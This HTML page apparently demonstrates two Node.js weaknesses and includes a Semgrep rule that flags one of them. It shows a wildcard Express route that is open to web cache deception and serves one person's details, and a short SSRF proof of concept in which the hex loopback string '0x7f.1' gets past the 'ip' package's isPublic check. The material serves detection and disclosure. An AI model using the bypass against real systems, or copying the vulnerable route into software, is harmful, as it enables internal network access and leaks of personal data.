<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Arka plan rengi */
        code {
            background-color: #f4f4f4;
            padding: 10px;
            display: block;
        }
    </style>
</head>
  
<body>

<h2>express/nodejs cache deception</h2>

<p>cache_deception.js</p>
<pre>
<code>
const express = require('express')
const app = express()
const port = 3000

app.get('/info/nuri.yavuz*', (req, res) => {
  res.send('Company: Trendyol, Birth Date: 1997, Country: Turkey, Phone: 5554443322')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})  
</code>
</pre>
  
<br></br>
  
<p>cache_deception_rule.yaml</p>
<pre>
<code>
rules:
  - id: express_route_decorator_detection
    patterns:
      - pattern-either:
          - pattern: $Y.get($X, ...)
          - pattern: $Y.post($X, ...)
          - pattern: $Y.put($X, ...)
          - pattern: $Y.delete($X, ...)
          - pattern: $Y.patch($X, ...)
      - pattern-inside: |
          require('express')
          ...
      - metavariable-pattern:
          metavariable: $X
          patterns:
            - pattern-regex: \/[^'"]*[*]
    message: "Detected express path decorator with * character may lead to web cache deception"
    severity: INFO
    languages: [js, javascript]
</code>
</pre>


</pre>
<h1>PoC</h1>
 <code>
        <br>var ip = require('ip');</br>
        <br>console.log(ip.isPublic("0x7f.1")); // true</br>
        <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
        <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
        <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
        <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
        <br>if (ip.isPublic(my_ip)) {</br>
            <br>fetch("http://" + my_ip).then((response) => {</br>
                <br>console.log(response);</br>
            <br>});</br>
        <br>} else {</br>
            <br>console.log("IP is not public");</br>
        <br>}</br>
 </code>
  
    
<video width="320" height="240" controls>
<source src="/semgrep/nodejs/express/express_cache_deception.mov" type="video/mp4">
</video> 

</body>
</html>

